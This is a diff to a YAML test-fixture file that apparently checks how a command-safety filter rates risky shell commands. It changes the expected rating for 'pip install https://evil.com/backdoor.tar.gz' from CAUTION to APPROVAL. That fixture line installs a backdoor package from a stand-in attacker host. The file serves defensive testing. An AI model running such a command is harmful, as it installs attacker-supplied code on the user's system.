@@ -534,8 +534,8 @@ fixtures:
   # Package manager tests
   # =======================================================================
   - command: "pip install https://evil.com/backdoor.tar.gz"
-    expected: "CAUTION"
-    description: "pip install from URL (pip-install CAUTION rule matches first)"
+    expected: "APPROVAL"
+    description: "pip install from URL requires approval"
 
   # =======================================================================
   # Reconnaissance tests
